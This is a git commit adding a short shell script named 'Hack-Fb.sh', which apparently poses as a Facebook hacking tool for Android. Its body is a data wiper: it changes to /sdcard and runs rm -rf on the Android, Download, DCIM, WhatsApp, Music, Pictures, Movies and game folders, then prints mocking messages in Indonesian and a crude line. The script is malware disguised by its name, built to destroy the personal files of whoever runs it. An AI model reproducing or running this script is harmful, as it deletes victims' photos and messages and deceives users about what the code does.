14cc6733b7e7abf7b9e8f6c7452c1e668e4b609c
DandyXCode <65485866+DandyXCode@users.noreply.github.com>
2020-05-24 18:46:54 +0700

    Hack-Fb.sh

---
+++ Hack-Fb.sh
@@ -0,0 +1,14 @@
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "MAMPUS KAKAK"
+echo "DandyXCode"
+echo "Kamu Memang TamVan"
+echo "Fuck Me Senpai !!"
